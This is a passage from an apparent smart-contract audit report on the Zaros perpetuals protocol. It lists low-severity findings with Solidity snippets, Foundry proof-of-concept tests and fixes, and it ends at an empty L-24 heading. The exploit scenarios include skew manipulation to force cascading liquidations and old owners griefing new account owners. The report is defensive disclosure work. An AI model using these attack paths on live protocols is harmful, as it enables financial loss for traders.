`lastFundingTime` is used in order to calculate the fundingFeePerUnit but it is not initialized to any value before it is used meaning it is going to be equal to 0 for the first user interacting with the contract which is going to lead to them receiving or paying a much larger funding fee.

## Vulnerability Details

When a user's order is executed by the keeper using `SettlementBranch::fillMarketOrder` the `fundingFeePerUnitX18` is calculated by calling `PerpMarket::getNextFundingFeePerUnit` which after 2 more function calls, calls the function `getProportionalElapsedSinceLastFunding`. If we take a look at the body of the function we can see it calculates `block.timestamp - self.lastFundingTime`.

```solidity
    function getProportionalElapsedSinceLastFunding(Data storage self) internal view returns (UD60x18) {
        return ud60x18Convert(block.timestamp - self.lastFundingTime).div(
            ud60x18Convert(Constants.PROPORTIONAL_FUNDING_PERIOD)
        );
    }
```

The problem lies in the fact that `self.lastFundingTime` will not be initialized for the first transaction in a market when this function is called and it will be equal to 0, making the `getProportionalElapsedSinceLastFunding` function return a number much bigger than it is supposed to.

The first time `lastFundingTime` is set is in the next function call inside `SettlementBranch::_fillOrder` which calls `PermMarket::updateFunding`

```solidity
    /// @notice Updates the market's funding values.
    /// @param self The PerpMarket storage pointer.
    /// @param fundingRate The market's current funding rate.
    /// @param fundingFeePerUnit The market's current funding fee per unit.
    function updateFunding(Data storage self, SD59x18 fundingRate, SD59x18 fundingFeePerUnit) internal {
        self.lastFundingRate = fundingRate.intoInt256();
        self.lastFundingFeePerUnit = fundingFeePerUnit.intoInt256();
@>      self.lastFundingTime = block.timestamp;
    }
```

## Impact

The first trade in a market will have its funding fee calculated wrongly which can lead to inaccurate funding fee transfers between users.

## Tools Used

Manual review
VS Code

## Recommendations

Call `PermMarket::updateFunding` when a new market is being initialized

## <a id='L-17'></a>L-17. Low severity findings

_Submitted by [0xpep7](https://profiles.cyfrin.io/u/0xpep7), [s3v3ru5](https://profiles.cyfrin.io/u/s3v3ru5), [n0kto](https://profiles.cyfrin.io/u/n0kto), [b0g0](https://profiles.cyfrin.io/u/b0g0). Selected submission by: [s3v3ru5](https://profiles.cyfrin.io/u/s3v3ru5)._      
            


# SEV 10: Multiple branches have initializers that use same storage slot to determine initialization state of the contract

Severity: Low

## Summary

The protocol has multiple branches with `initialization` functions, all using a single `initialized` variable. As a result, all branches must be initialized in the constructor otherwise the initialization fails. and the future branches should not use `initializer` modifier of `Initializable` library.

## Vulnerability Details

The `GlobalConfigurationBranch`, `SettlementBranch`, and `UpgradeBranch` branches have initialize functions marked with `initializer` modifier of OZ `Initializable` library.

Because `Initializable` uses a static storage slot for `initialized` flag and all the branches refer the same storage, the first initialization function will mark the contract as initialiazed. It should not be possible to initialize rest of the branches.

However, the OZ `Initializable` contract allows execution of multiple `initialization` functions in the constructor for testing purposes.

Definition of `initializer` modifier: [openzeppelin-contracts/contracts/proxy/utils/Initializable.sol#L98-L120](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/659f3063f82422cef820de746444e6f6cba6ca7c/contracts/proxy/utils/Initializable.sol#L98-L120)

```solidity
    /*
     * Similar to `reinitializer(1)`, except that in the context of a constructor an `initializer` may be invoked any
     * number of times. This behavior in the constructor can be useful during testing and is not expected to be used in
     * production.
     *
     * Emits an {Initialized} event.
     */
    modifier initializer() {
        [...]
            // Allowed calls:
        // - initialSetup: the contract is not in the initializing state and no previous version was
        //                 initialized
        // - construction: the contract is initialized at version 1 (no reininitialization) and the
        //                 current contract is just being deployed
        bool initialSetup = initialized == 0 && isTopLevelCall;
        bool construction = initialized == 1 && address(this).code.length == 0;
```

This allows initializing all the branches if all the branches are added in the constructor of `RootProxy`. If any of the branch is not added in the constructor then the contract needs to be redeployed.

## Impact

The branches cannot be initialized if are not initialized in the constructor. Future branches cannot use `initializer` modifier.

## Tools Used

Manual Review

## Recommendations

Store `initialized` flag per branch. Otherwise, consider using `reinitializer` with incremental values for initializable functions.

# SEV 11: Precision loss in the conversion of token amount into its decimals

Severity: Low

## Summary

All computations are performed with 18 decimals in the system. The token amounts are converted to token decimals before calling the token `transfer` function. This conversion results in precision loss resulting transfer of less value.

The conversion is performed while deducting margin to pay for fees, and to cover for the debt when an account is liquidated. The receiver is always the protocol: protocol controlled keepers receive order, settlement and liquidation fees, and protocol when account is liquidated.

Considering the system supports `WBTC` token which has `8` decimals and is of significant value, the losses add up from multiple interactions and become non-negligible.

## Vulnerability Details

The `TradingAccount::withdrawMarginUsd` function is used to deduct from trader's collateral

Snippet of `withdrawMarginUsd` performing the conversions: [TradingAccount.sol#L451-L467](https://github.com/Cyfrin/2024-07-zaros/blob/d687fe96bb7ace8652778797052a38763fbcbb1b/src/perpetuals/leaves/TradingAccount.sol#L451-L467)

The `withdrawMarginUsd` function calculates the amount to be deducted in `18` decimals. Because the token might have different decimals the amount is converted into the token amount using the `MarginCollateralConfiguration::convertUd60x18ToTokenAmount` function.

Definition of the `MarginCollateralConfiguration::convertUd60x18ToTokenAmount` function:
[MarginCollateralConfiguration.sol#L57-L63](https://github.com/Cyfrin/2024-07-zaros/blob/d687fe96bb7ace8652778797052a38763fbcbb1b/src/perpetuals/leaves/MarginCollateralConfiguration.sol#L57-L63)

The conversion truncates the lower `SYSTEM_DECIMALS - TOKEN_DECIMALS` leading to precision loss. The `withdrawMarginUsd`function still considers before the conversion as the value transfer.

POC:

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.25;

import { UD60x18, ud60x18, convert as ud60x18Convert  } from "@prb-math/UD60x18.sol";

import {Test} from "forge-std/Test.sol";
import "forge-std/console.sol";


contract PrecisionLossTest is Test {
    uint8 internal constant SYSTEM_DECIMALS = 18;
    function convertUd60x18ToTokenAmount(UD60x18 ud60x18Amount, uint8 tokenDecimals) internal pure returns(uint256) {
        return ud60x18Amount.intoUint256() / (10 ** (SYSTEM_DECIMALS - tokenDecimals));
    }

    function test_precision_loss() external {
        UD60x18 btcPrice = ud60x18Convert(68818);
        uint8 btcDecimals = 8;
        UD60x18 usdLostInConversion = ud60x18(0);

        uint256 amountUsd = 100;
        for(uint i = 0; i < 100000; i++) {
            // iteration for each trade
            UD60x18 amountUsdx18 = ud60x18Convert(amountUsd);
            amountUsd++;
            // requiredMarginInCollateralX18 is amount protocol considers to be withdrawn
            UD60x18 requiredMarginInCollateralX18 = amountUsdx18.div(btcPrice);

            uint256 actualAmountTransferred = convertUd60x18ToTokenAmount(requiredMarginInCollateralX18, btcDecimals);

            // IERC20(collateralType).safeTransfer(recipient, actualAmountTransferred)

            UD60x18 collateralAmountLostInConversion = requiredMarginInCollateralX18.sub(ud60x18(actualAmountTransferred * (10**(SYSTEM_DECIMALS - btcDecimals))));
            usdLostInConversion = usdLostInConversion.add(collateralAmountLostInConversion.mul(btcPrice));
        }

        // Logs:
        //  usdLostInConversion: 34.407431376559190422
        emit log_named_decimal_uint("usdLostInConversion", usdLostInConversion.intoUint256(), 18);
    }
}
```

```Solidity
Logs:
 usdLostInConversion: 34.407431376559190422
```

## Impact

Keepers receive lesser fee than the actual because of precision loss. The difference might become significant in the long run based on the amount of trades executed.

## Tools Used

Manual Review

## Recommendations

Updated the `if` condition in `TradingAccount::withdrawMarginUsd` with the following:

```solidity
        UD60x18 deductedAmountX18;
        uint256 amountToTransfer;

        amountToTransfer = marginCollateralConfiguration.convertUd60x18ToTokenAmount(requiredMarginInCollateralX18);
        amountToTransfer += 1;
        
        uint256 marginCollateralBalanceTk = marginCollateralConfiguration.convertUd60x18ToTokenAmount(marginCollateralBalanceX18);
        
        if (marginCollateralBalanceTk >= amountToTransfer) {
            deductedAmountX18 = marginCollateralConfiguration.convertTokenAmountToUd60x18(amountToTransfer);
            withdraw(self, collateralType, deductedAmountX18);

            IERC20(collateralType).safeTransfer(recipient, amountToTransfer);

            withdrawnMarginUsdX18 = amountUsdX18;
            isMissingMargin = false;
        } else {
            deductedAmountX18 = marginCollateralConfiguration.convertTokenAmountToUd60x18(marginCollateralBalanceTk);
            withdraw(self, collateralType, marginCollateralBalanceX18);

            IERC20(collateralType).safeTransfer(recipient, marginCollateralBalanceTk);

            withdrawnMarginUsdX18 = marginCollateralPriceUsdX18.mul(deductedAmountX18);
            isMissingMargin = true;
        }
```

# SEV 12: TradingAccountBranch::createTradingAccountAndMulticall is payable and uses delegateCall in a loop

Severity: Low

## Summary

The `TradingAccountBranch::createTradingAccountAndMulticall` function is to allow traders perform multiple operations after creating a trading account in the same transaction.

The `createTradingAccountAndMulticall` is a payable function and calls `self` using delegate calls in a loop. As a result, the `msg.value` will be same for all calls.

* The value transfer happens only once and the contract would consider `msg.value` as separate transfer for each individual delegate call. Presence of a function that uses `msg.value` could lead to loss in funds.
* The function cannot be used to call a `payable` function with non-zero value and the `non-payable` functions. The `depositMargin` is the main function that is intended to be called in the function and is `non-payable`

Definition of the `createTradingAccountAndMulticall` function: [TradingAccountBranch.sol#L285-L311](https://github.com/Cyfrin/2024-07-zaros/blob/d687fe96bb7ace8652778797052a38763fbcbb1b/src/perpetuals/branches/TradingAccountBranch.sol#L285-L311)

## Vulnerability Details

see summary

## Impact

* Addition of a payable function that uses `msg.value` could lead to funds loss.
* Traders cannot perform a payable operation with non-zero value and non-payable operations.

## Tools Used

Manual Review

## Recommendations

Remove the `payable` modifier. Do not use delegateCall in a loop in payable functions.

# SEV 13: Incorrect implementation of slippage protection for offline orders

Severity: Low

## Summary

The condition used for slippage protection is in reverse:

```solidity
            // if the order increases the trading account's position (buy order), the fill price must be less than or
            // equal to the target price, if it decreases the trading account's position (sell order), the fill price
            // must be greater than or equal to the target price.
            ctx.isFillPriceValid = (ctx.isBuyOrder && ctx.offchainOrder.targetPrice <= ctx.fillPriceX18.intoUint256())
                || (!ctx.isBuyOrder && ctx.offchainOrder.targetPrice >= ctx.fillPriceX18.intoUint256());
```

## Vulnerability Details

The offline orders have a `targetPrice` parameter which is used for slippage protection. It is considered as maximum fill price for buy orders and minimum fill price for sell orders.

The `SettlementBranch::fillOffchainOrders` validates the order's fill price with the `targetPrice`.

Slippage protection condition in the`fillOffchainOrders` function: [SettlementBranch.sol#L283-L292](https://github.com/Cyfrin/2024-07-zaros/blob/d687fe96bb7ace8652778797052a38763fbcbb1b/src/perpetuals/branches/SettlementBranch.sol#L283-L292)

The implementation incorrectly uses `targetPrice` as minimum fill price for buy orders and as maximum fill price for sell orders.

As a result, slippage protection will prevent orders from filling at "good price" and only allows them to be filled at "bad price". The orders are forced to be filled at bad prices.

Exploit Scenario:

* Trader creates a order to open a Long position on BTC market
* Current fill price = `68018`
* Trader sets the `targetPrice` = `68030`

Attempts to fill the trader's order will fail until fill price becomes `>= 68030` and the trader buys at a bad price of `68030`

## Impact

Slippage protection works against the trader. Filling offline orders will fail for orders with reasonable `targetPrice`. In case the orders succeeds then the order will be filled at a bad price.

## Tools Used

Manual Review

## Recommendations

Change the condition used for computing `isFillPriceValid`

```solidity
            ctx.isFillPriceValid = (ctx.isBuyOrder && ctx.offchainOrder.targetPrice >= ctx.fillPriceX18.intoUint256())
                || (!ctx.isBuyOrder && ctx.offchainOrder.targetPrice <= ctx.fillPriceX18.intoUint256());
```

# SEV 14: OrderBranch::simulateTrade function uses after-trade account profit to compute before-the-trade margin balance

Severity: Low

## Summary

The `OrderBranch::simulateTrade` function ensures the liquidatable accounts cannot create market orders. While computing the account's margin balance, the function uses the estimated pnl after the requested order is processed. However, the function should have used the pnl computed before the trade.

## Vulnerability Details

`simulateTrade` function using the after-the-trade pnl for computing before-the-trade margin balance:

Incorrect snippet of the `simulateTrade` function: [OrderBranch.sol#L121-L137](https://github.com/Cyfrin/2024-07-zaros/blob/d687fe96bb7ace8652778797052a38763fbcbb1b/src/perpetuals/branches/OrderBranch.sol#L121-L137)

Every trade influences the `markPrice`. As a result, the `pnl` computed after the trade will be different from the before-the-trade. As a result, the `OrderBranch::simulateTrade` might consider account which is not liquidatable as liquidatable and might consider liquidatable as non-liquidatable.

## Impact

Accounts which are not liquidatable might be considered as liquidatable and protocol might reject creation of valid market order.

## Tools Used

Manual Review

## Recommendations

Store the `pnl` returned by `tradingAccount.getAccountMarginRequirementUsdAndUnrealizedPnlUsd(0, SD59x18_ZERO);` on `L131` for before the trade pnl. Use this value in the computation of trader's margin balance for performing the account liquidatable check.

# SEV 15: The GlobalConfiguration::configureCollateralLiquidationPriority always adds new tokens at the end

Severity: Low

## Summary

The `collateralLiquidationPriority` list is used as the collateral priority queue for liquidation. The list is intended to have volatile and more riskier tokens before stable tokens. Because the `configureCollateralLiquidationPriority` function always adds the newly supported tokens at the end, the queue might result in liquidating stable tokens first if the new token is volatile.

Definition of the `configureCollateralLiquidationPriority`  function: [GlobalConfiguration.sol#L101-L112](https://github.com/Cyfrin/2024-07-zaros/blob/d687fe96bb7ace8652778797052a38763fbcbb1b/src/perpetuals/leaves/GlobalConfiguration.sol#L101-L112)

Exploit Scenario:

The Zaros developers add support for `cbEth` token. The `configureCollateralLiquidationPriority` adds the token at the end after stable tokens such as `USDC`, `USDT`. The stable tokens are liquidated first and liquidation might leave volatile-riskier `cbEth` token in trader's balance.

## Vulnerability Details

see summary.

## Impact

Liquidation might leave more-riskier, less-stable tokens in trader's collateral if the newly added token is less-stable token.

## Tools Used

Manual Review

## Recommendations

Update the `configureCollateralLiquidationPriority` function to have an additional `indexes` parameter and to insert the new tokens at the specified indexes.

## <a id='L-18'></a>L-18. Missing expiration check in `Data Streams` report validation allows the use of expired report data

_Submitted by [forgetfore1](https://profiles.cyfrin.io/u/forgetfore1), [cryptomoon](https://profiles.cyfrin.io/u/cryptomoon), [0xstalin](https://profiles.cyfrin.io/u/0xstalin), [0xshoonya](https://profiles.cyfrin.io/u/0xshoonya). Selected submission by: [0xshoonya](https://profiles.cyfrin.io/u/0xshoonya)._      
            


## Summary

The `requireDataStreamsReportIsValid` function in the contract fails to check the `expiresAt` timestamp of the `PremiumReport`, potentially allowing the use of expired data.

## Vulnerability Details

The vulnerability lies in the [requireDataStreamsReportIsValid](https://github.com/Cyfrin/2024-07-zaros/blob/d687fe96bb7ace8652778797052a38763fbcbb1b/src/perpetuals/leaves/SettlementConfiguration.sol#L87-L103) function in `SettlementConfiguration.sol`:

```js
function requireDataStreamsReportIsValid(
    bytes32 streamId,
    bytes memory verifiedReportData,
    uint256 maxVerificationDelay
)
    internal
    view
{
    PremiumReport memory premiumReport = abi.decode(verifiedReportData, (PremiumReport));

    if (
        streamId != premiumReport.feedId ||
        block.timestamp > premiumReport.validFromTimestamp + maxVerificationDelay 
    ) {
        revert Errors.InvalidDataStreamReport(streamId, premiumReport.feedId);
    }
}
```

The function correctly checks if the `streamId` matches the `feedId` in the report and if the current `block.timestamp` is not later than `validFromTimestamp + maxVerificationDelay`.

However, it fails to check the `expiresAt` field of the `PremiumReport`.

According to chainlink [docs](https://docs.chain.link/data-streams/reference/report-schema) Report Schema has a `uint32 expiresAt` timestamp which denotes the expiration timestamp of this report.

> expiresAt      uint32 The expiration date of this report

If `expiresAt` is less than `validFromTimestamp + maxVerificationDelay`, it means the report will expire before it’s considered invalid based on the `maxVerificationDelay`. This could lead to a situation where an expired report is still considered valid.

## Impact

The Settlements in the protocol may use expired price data for critical operations, leading to incorrect pricing and unfair trades.

## Tools Used

Manual Review

## Recommendations

Add a check to `requireDataStreamsReportIsValid`:

```diff
    function requireDataStreamsReportIsValid(
        bytes32 streamId,
        bytes memory verifiedReportData,
        uint256 maxVerificationDelay
    )
        internal
        view
    {
        PremiumReport memory premiumReport = abi.decode(verifiedReportData, (PremiumReport));

        if (
            streamId != premiumReport.feedId ||
            block.timestamp > premiumReport.validFromTimestamp + maxVerificationDelay ||
+           block.timestamp > premiumReport.expiresAt  
        ) {
            revert Errors.InvalidDataStreamReport(streamId, premiumReport.feedId);
        }
    }
```


## <a id='L-19'></a>L-19. Fees are not sent to their respective recipients when dealing with low decimals tokens

_Submitted by [s3v3ru5](https://profiles.cyfrin.io/u/s3v3ru5), [nfmelendez](https://profiles.cyfrin.io/u/nfmelendez), [greed](https://profiles.cyfrin.io/u/greed), [infect3d](https://profiles.cyfrin.io/u/infect3d), [jsmi](https://profiles.cyfrin.io/u/jsmi), [Oblivionis](https://profiles.cyfrin.io/u/Oblivionis). Selected submission by: [greed](https://profiles.cyfrin.io/u/greed)._      
            


## Summary

In order to handle low decimals tokens everywhere in the protocol, Zaros starts by scaling such token amount to 18 decimals so rounding errors are avoided.

When users adjust their positions, a part of their trades are collected as fees and sent to the fee recipients. There are 3 types of fees :

* settlement fees
* order fees
* PnL fees

The fees are collected when an account is being liquidated or an order is fulfilled, in the `SettlementBranch::_fillOrder()` and `LiquidationBranch::liquidateAccounts()` functions respectively.

These 2 functions use another interal function called `TradingAccount::deductAccountMargin()` where all the logic is implemented.

This function will loop through all the allowed collateral and give the due **scaled** USD value to `withdrawMarginUsd()`

<https://github.com/Cyfrin/2024-07-zaros/blob/main/src/perpetuals/leaves/TradingAccount.sol#L528-L566>

```solidity
if (settlementFeeUsdX18.gt(UD60x18_ZERO) && ctx.settlementFeeDeductedUsdX18.lt(settlementFeeUsdX18)) {
    // attempt to deduct from this collateral difference between settlement fee
    // and amount of settlement fee paid so far
>    (ctx.withdrawnMarginUsdX18, ctx.isMissingMargin) = withdrawMarginUsd(
        self,
        collateralType,
        ctx.marginCollateralPriceUsdX18,
        settlementFeeUsdX18.sub(ctx.settlementFeeDeductedUsdX18),
        feeRecipients.settlementFeeRecipient
    );

    // update amount of settlement fee paid so far by the amount
    // that was actually withdraw from this collateral
    ctx.settlementFeeDeductedUsdX18 = ctx.settlementFeeDeductedUsdX18.add(ctx.withdrawnMarginUsdX18);
}
```

In `withdrawMarginUsd()`, before transferring the tokens to the recipients, the **scaled** token amount will be down scaled using the `MarginCollateralConfiguration::convertUd60x18ToTokenAmount()` function.

<https://github.com/Cyfrin/2024-07-zaros/blob/main/src/perpetuals/leaves/TradingAccount.sol#L434-L469>

```solidity
withdraw(self, collateralType, requiredMarginInCollateralX18);
amountToTransfer =
    marginCollateralConfiguration.convertUd60x18ToTokenAmount(requiredMarginInCollateralX18);

IERC20(collateralType).safeTransfer(recipient, amountToTransfer);

withdrawnMarginUsdX18 = amountUsdX18;
isMissingMargin = false;
```

## Vulnerability Details

The issue is that the given `requiredMarginInCollateralX18` is so small, when the downscaling occurs, the returned token amount will equal `0`.

When dealing with WBTC for example, the `requiredMarginInCollateralX18` will be divided by `1e10` which will round to `0`.

So the contract will transfer `0 WBTC` to the fee recipients, leaving this fee in the contract but still reducing the trader's account margins as if the transfer actually happened.

Currently, the supported tokens allow 0 amount transfers but the protocol should keep in mind that some tokens revert when attempting to transfer zero tokens.

This coded PoC can be pasted in *test\integration\perpetuals\perp-market-branch\getFundingRate\getFundingRate.t.sol* and demonstrates a user performing various operations that should be collecting fees. However, the recipients never receive them.

```solidity
function testBypassFeesAndDustStuck() external {
    uint256 btcBalance = 10e8;

    deal({ token: address(wBtc), to: users.naruto.account, give: btcBalance });

    vm.startPrank(users.naruto.account);
    uint128 tradingAccountId = createAccountAndDeposit(btcBalance, address(wBtc));
    int128 narutoPosSizeDelta = int128(uint128(btcBalance));

    // recipients start with no WBTC
    assertEq(wBtc.balanceOf(users.orderFeeRecipient.account), 0);
    assertEq(wBtc.balanceOf(users.settlementFeeRecipient.account), 0);
    assertEq(wBtc.balanceOf(users.liquidationFeeRecipient.account), 0);

    // various operations are performed over time which should generate fees
    openManualPosition(ETH_USD_MARKET_ID, ETH_USD_STREAM_ID, MOCK_ETH_USD_PRICE, tradingAccountId, int128(ETH_USD_MIN_TRADE_SIZE) * 1_000);

    skip(5 days);
    openManualPosition(ETH_USD_MARKET_ID, ETH_USD_STREAM_ID, MOCK_ETH_USD_PRICE, tradingAccountId, int128(ETH_USD_MIN_TRADE_SIZE) * 1_000);
    
    updateMockPriceFeed(ETH_USD_MARKET_ID, MOCK_ETH_USD_PRICE - (MOCK_ETH_USD_PRICE / 10)); // price drops -10%
    skip(5 days);
    
    // user closes his position
    openManualPosition(ETH_USD_MARKET_ID, ETH_USD_STREAM_ID, MOCK_ETH_USD_PRICE, tradingAccountId, -int128(ETH_USD_MIN_TRADE_SIZE * 2_000));

    assertEq(wBtc.balanceOf(address(perpsEngine)), btcBalance);

    // user withdraws the maximum collateral he can
    perpsEngine.withdrawMargin(tradingAccountId, address(wBtc), 999999999);

    // user retrieves almost his whole collateral, leaving 1 wei of dust in the contract
    assertEq(wBtc.balanceOf(address(perpsEngine)), 1);
    assertEq(wBtc.balanceOf(users.naruto.account), 999999999);

    // recipients earned no fees
    assertEq(wBtc.balanceOf(users.orderFeeRecipient.account), 0);
    assertEq(wBtc.balanceOf(users.settlementFeeRecipient.account), 0);
    assertEq(wBtc.balanceOf(users.liquidationFeeRecipient.account), 0);
}
```

## Impact

Fee recipients do not receive their due and these fees end up stuck in the contract.

## Tools Used

Manual review

## Recommendations

The issue can hardly be patched because the fee percentages are so small, the downscaling will most likely round to 0.

An idea when this happens would be to collect a flat amount of tokens.

## <a id='L-20'></a>L-20. When transfering the NFT associated to a TradingAccount, the old owner can grief the new owner by leaving an opened MarketOrder that will be executed even though the old owner is not the owner of the TradingAccount.

_Submitted by [spearmint](https://profiles.cyfrin.io/u/spearmint), [giraffe0x](https://profiles.cyfrin.io/u/giraffe0x), [s3v3ru5](https://profiles.cyfrin.io/u/s3v3ru5), [0xstalin](https://profiles.cyfrin.io/u/0xstalin), [krisrenzo](https://profiles.cyfrin.io/u/krisrenzo), [alexczm](https://profiles.cyfrin.io/u/alexczm). Selected submission by: [0xstalin](https://profiles.cyfrin.io/u/0xstalin)._      
            


````markdown
## Summary
Old Owner of a TradingAccount can grief the new owner by leaving an opened MarketOrder that will be executed even though the old owner is not the current owner of the TradingAccount.

## Vulnerability Details
[When filling a MarketOrder](https://github.com/Cyfrin/2024-07-zaros/blob/main/src/perpetuals/branches/SettlementBranch.sol#L107-L166), there are no validations to check if the MarketOrder associated to the TradingAccount was indeed created by the current owner of the TradingAccount, the execution assumes that the market order was indeed created by the TradingAccount's owner.

The problem with assuming that the owner of the TradingAccount was the one who created the MarketOrder is that, this allows a grieffing vector that when transfering accounts among users, the existing owner can create a MarketOrder, then transfer the NFT (and subsequently transfer the ownership of the TradingAccount), and, after that, the MarketOrder created by the old owner is still active and will be able to be filled, regardless of the new owner.

The [`AccountNFT._update() function`](https://github.com/Cyfrin/2024-07-zaros/blob/main/src/account-nft/AccountNFT.sol#L23-L28) is called as part of the execution to transfer the NFT associated to the TradingAccount, but, the MarketOrder of the account is not canceled.
```
function _update(address to, uint256 tokenId, address auth) internal virtual override returns (address) {

    address previousOwner = super._update(to, tokenId, auth);

    //@audit => Notifies the engine about the new owner of the TradingAccount
    IPerpsEngine(owner()).notifyAccountTransfer(to, tokenId.toUint128());

    return previousOwner;
}
```


## Impact
The old Owner of a TradingAccount can grief the new owner by leaving an opened MarketOrder that can affect the PnL of the position.

## Tools Used
Manual Audit

## Recommendations
When calling the [`AccountNFT._update() function`](https://github.com/Cyfrin/2024-07-zaros/blob/main/src/account-nft/AccountNFT.sol#L23-L28) to notify the PerpsEngine contract about the new owner of the TradingAccount, also make sure to erase the MarketOrder associated to the TradingAccount, in this way, the new owner will receive the TradingAccount with an empty Market Order.
````

## <a id='L-21'></a>L-21. The first trader in a market will have a wrong inflated fundingRate

_Submitted by [spearmint](https://profiles.cyfrin.io/u/spearmint)._      
            


## Summary

The first trader in a market will have a wrong inflated fundingRate

## Vulnerability Details

When filling an order `fundingRate` is calculated using `perpMarket.getCurrentFundingRate()`, taking a look inside it

```solidity
function getCurrentFundingRate(Data storage self) internal view returns (SD59x18) {
        return sd59x18(self.lastFundingRate).add(
            getCurrentFundingVelocity(self).mul(getProportionalElapsedSinceLastFunding(self).intoSD59x18()) 
        );
```

The `fundingRate` clearly depends on what `getProportionalElapsedSinceLastFunding` returns, taking a look inside it

```solidity
function getProportionalElapsedSinceLastFunding(Data storage self) internal view returns (UD60x18) { 
        return ud60x18Convert(block.timestamp - self.lastFundingTime).div( 
            ud60x18Convert(Constants.PROPORTIONAL_FUNDING_PERIOD)
        );
```

For the first order being filled `self.lastFundingTime` = 0, therefore `getProportionalElapsedSinceLastFunding` will return a very large positive value, therefore

`fundingFeePerUnit` is a value proportional to the `fundingRate`

## Impact

The first trader in a market will have a wrong inflated fundingRate

will have wrong calculations anything to do with funding rate

## Tools Used

Manual Review

## Recommendations

initialize `lastFundingTime` in `PerpMarket.sol` to a reasonable value when the contract is deployed

## <a id='L-22'></a>L-22. Users can be overcharged for orderFees

_Submitted by [giraffe0x](https://profiles.cyfrin.io/u/giraffe0x), [krisrenzo](https://profiles.cyfrin.io/u/krisrenzo). Selected submission by: [krisrenzo](https://profiles.cyfrin.io/u/krisrenzo)._      
            


## Summary

Users can be overcharged for order fees because it uses the protocol uses the wrong price to calculate the order fee.

## Vulnerability Details

Order fee is incorrectly [calculated with markPrice instead of indexPrice as seen here](https://github.com/Cyfrin/2024-07-zaros/blob/69ccf428b745058bea08804b3f3d961d31406ba8/src/perpetuals/leaves/PerpMarket.sol#L199).

```js
 orderFeeUsd = markPriceX18.mul(sizeDelta.abs().intoUD60x18()).mul(feeBps);
```

**Key definitions**

* **skew:** a measure of how far or close the price of a derivative is to the price of the underlying asset. The closer to zero the skew is, the closer to the derivative price is to the index price.
* **index price:** the real price of the underlying asset. Zaros sources this from Chainlink and other off-chain oracles.
* **mark price:** the price of the derivative in Zaros after the skew has been factored into the index price.

Mark price is used when settling orders and liquidation as they directly impact the open interest and skew of the protocol. This is important to keeping the derivatives assets price as close to the underlying asset's price as possible.  The idea is to encourage selling activities when the derivative price has been pushed higher than the index price, and vice versa.
As stated before using mark price for trading activities that affect the derivative price movement makes sense, but outside of that, the index price is the right price to use for maintaining market fairness.&#x20;

Zaros order fees do not impact the open interest or skew as they are not cut from the position or order size delta. These fees are charged directly to the account's margin balance and sent to the corresponding fee receipient. The tokens do not hit the market at any point. They do not affect the size delta, skew, or open interest.

Using mark price instead of index price to calculate order fee can cause the protocol to overcharge the users on order fees. Not only does this not conform to the standard for the perpetual market, but it can disincentivize users from entry trades that should help bring the skew closer to zero when it strays far from it. A further inconsistency is the use of index prices for settlement and liquidation fee calculations.

## Impact

When the mark price is greater than the index price, the cost of entering the market increases, and the farther the skew strays from zero the more disincentivized traders are to enter the market, including counter traders needed to bring the price back down to the desired level. This means the fees paid by traders in the market are directly impacted by other traders' activities, and they can effectively cause them to pay a larger fee.

## Tools Used

Manual

## Recommendations

Use index price to calculate order fees.

## <a id='L-23'></a>L-23. markPrice Can Be Influenced To Cause Cascading Liquidations

_Submitted by [giraffe0x](https://profiles.cyfrin.io/u/giraffe0x), [izuman](https://profiles.cyfrin.io/u/izuman), [Oblivionis](https://profiles.cyfrin.io/u/Oblivionis). Selected submission by: [giraffe0x](https://profiles.cyfrin.io/u/giraffe0x)._      
            


## Summary

Margin values are determined by `markPrice` which is easily influenced by skew impact. An attacker can create a large position to push skew in one direction and force other traders to be liquidated. As each trader is liquidated, it further worsens the skew and causes cascading liquidations.

## Vulnerability Detail

The function `getAccountMarginRequirementUsdAndUnrealizedPnlUsd` is used to calculate Initial Margin (IM), Maintenance Margin (MM) and unrealized PnL. These variables are used during `liquidateAccounts` to check if an account has sufficient margin.

The issue lies with using `markPrice`to compute these variables, which is easily influenced by skew. 1) A well-capitalized attacker could create a position to greatly imbalance skew, 2) When obtaining `markPrice` for the to-be-liquidated account, a sell simulation is performed which further worsens skew, returning a more undesirable price:

```Solidity
function getAccountMarginRequirementUsdAndUnrealizedPnlUsd() {
	...
	// calculate price impact as if trader were to close the entire position
	UD60x18 markPrice = perpMarket.getMarkPrice(sd59x18(-position.size), perpMarket.getIndexPrice());
	...
	// markPrice used to calculate notional value, which is used to calculate IM/MM
	UD60x18 notionalValueX18 = sd59x18(position.size).add(sizeDeltaX18).abs().intoUD60x18().mul(markPrice);
	
	(UD60x18 positionInitialMarginUsdX18, UD60x18 positionMaintenanceMarginUsdX18) = Position.getMarginRequirement(
			notionalValueX18,
			ud60x18(perpMarket.configuration.initialMarginRateX18),
			ud60x18(perpMarket.configuration.maintenanceMarginRateX18)
		);
	...
}	
```

The higher the `markPrice`, the higher `notionalValueX18` is and therefore a higher IM/MM is required to avoid liquidation.

Consider this scenario:

* Bob has a -100 short entered at \$5
* Alice the whale creates a +1000 long and pushes price to \$6
* Price impact is calculated as if Bob closed his entire position. I.e. if Bob were to go +100 long, in an already long-skewed market which pushes price even higher to \$6.1
* Bob's `notionalValueX18` is calculated as 100 \* 6.1 = \$610
* Bob's IM and MM requirements are raised putting him at liquidation risk
* Bob's also experiences a PnL loss of ($5 -$6.1) \* 100 = -\$110

See coded POC here: <https://gist.github.com/giraffe0x/d4efa0dd15eabc86153bc5a716d2c77e>

This could also happen to longs but the risk is greater for shorts, as increasing `markPrice` not only increases IM/MM but also means lower PnL.

## Impact

High. A whale attacker can easily influence markPrice and liquidate other users unfairly, short traders are most at risk.

This also results in cascading liquidations as each liquidated position pushes price further in the undesired direction (e.g. in a long-skewed market, a short position is liquidated, long-skew increases, markPrice increases, more short positions are liquidated).

## Code Snippet

<https://github.com/Cyfrin/2024-07-zaros/blob/main/src/perpetuals/leaves/TradingAccount.sol#L232>

## Tool used

Manual Review

## Recommendation

* Consider using an oracle price instead of markPrice to calculate margin values. The purpose of using mark/fill price in Perps is to provide an auto-correct mechanism for price to converge with oracle price. It should not be used to determine liquidations which then further aggravates the gap between mark and oracle price.
* Consider a rate-limited liquidation mechanism to prevent cascading liquidations. For example. within a 5-minute window, only \$X amount of liquidations allowed. This would give time for the market to absorb any liquidations and avoid cascading sharp drawdowns. &#x20;

## <a id='L-24'></a>L-24. Margin Calculation In fillOrder Does Not Consider Mark Price Impact

_Submitted by [giraffe0x](https://profiles.cyfrin.io/u/giraffe0x)._      
            


## Summary

